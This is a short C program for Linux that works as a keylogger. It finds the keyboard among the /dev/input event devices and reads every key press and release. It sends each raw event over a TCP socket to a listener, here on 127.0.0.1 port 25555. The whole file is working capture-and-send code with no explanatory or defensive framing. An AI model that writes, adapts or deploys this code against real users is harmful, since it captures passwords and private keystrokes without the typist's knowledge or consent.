#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>


void find_keyboard(char *keyboard) {
  char path[32];
  char name[256] = "Unknown";
  for (int i = 0; i < 32; i++) {
    snprintf(path, sizeof(path), "/dev/input/event%d", i);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
      close(fd);
      continue;
    }

    if (ioctl(fd, EVIOCGNAME(sizeof(name) - 1), name) < 0)
      perror("ioctl EVIOCGNAME");
    if (strstr(name, "keyboard") != NULL) {
      printf("path: %s\n", path);
      strcpy(keyboard, path);
      close(fd);
      return;
    }
    close(fd);
  }
}

int main() {
  char kbd_file[32];
  struct sockaddr_in sa;
  find_keyboard(kbd_file);
  printf("file: %s\n", kbd_file);
  int fd = open(kbd_file, O_RDONLY);
  if (fd < 0) {
    perror("open: ");
    exit(EXIT_FAILURE);
  }

  int Socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (Socket == -1) {
    perror("socket: ");
    close(fd);
    exit(EXIT_FAILURE);
  }

  memset(&sa, 0, sizeof sa);

  sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  sa.sin_family = AF_INET;
  sa.sin_port = htons(25555);

  if (connect(Socket, (struct sockaddr *)&sa, sizeof sa) == -1) {
    perror("socket connect: ");
    close(Socket);
    close(fd);
    exit(EXIT_FAILURE);
  }

  printf("connected\n");
  struct input_event ev;
  while (1) {
    int bytes_read = read(fd, &ev, sizeof(ev));

    if (bytes_read < sizeof(ev)) {
      perror("read error: ");
      break;
    }
    if (ev.type == EV_KEY && ev.value == 0 || ev.value == 1) {
      write(Socket, &ev,sizeof ev);
      printf("Key: %d\n", ev.code);
    }
  }
  close(Socket);
  close(fd);
  return 0;
}
